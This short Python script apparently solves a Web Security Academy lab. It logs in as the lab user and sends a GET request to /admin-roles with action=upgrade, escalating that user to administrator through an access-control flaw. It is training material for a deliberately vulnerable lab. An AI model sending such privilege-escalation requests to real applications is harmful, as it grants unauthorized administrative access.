from web_security_academy.core.logger import logger
from urllib.parse import urlencode


def solve_lab(session, *args):
    session.login("wiener", "peter", with_csrf=False)

    params = {"username": "wiener", "action": "upgrade"}
    logger.info(f'Visiting "{session.url}?{urlencode(params)}" (GET request)')
    resp = session.get_path("/admin-roles", params=params)

    if resp.status_code != 200:
        logger.failure("Did not get expected 200 status code.")
    else:
        logger.success("Success.")
